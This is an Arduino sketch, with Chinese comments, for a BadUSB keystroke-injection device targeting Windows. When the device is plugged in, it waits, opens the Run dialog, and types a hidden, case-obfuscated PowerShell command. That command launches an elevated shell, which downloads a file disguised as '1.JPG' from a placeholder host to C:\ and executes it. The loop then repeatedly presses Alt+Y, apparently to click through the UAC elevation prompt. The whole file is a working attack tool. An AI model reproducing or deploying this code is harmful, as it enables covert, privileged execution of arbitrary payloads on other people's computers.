void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(20000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("POWERSHELL -NOP -W HIDDEN -C \"sTART-pROCESS -fILEpATH POWERSHELL.EXE \'-NOP -W HIDDEN -C iNVOKE-wEBrEQUEST -URI HTTP://127.0.0.1/1.JPG -oUTfILE C:\\1.JPG;C:\\1.JPG\' -vERB RUNAS\"");
  Keyboard.println();
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
}
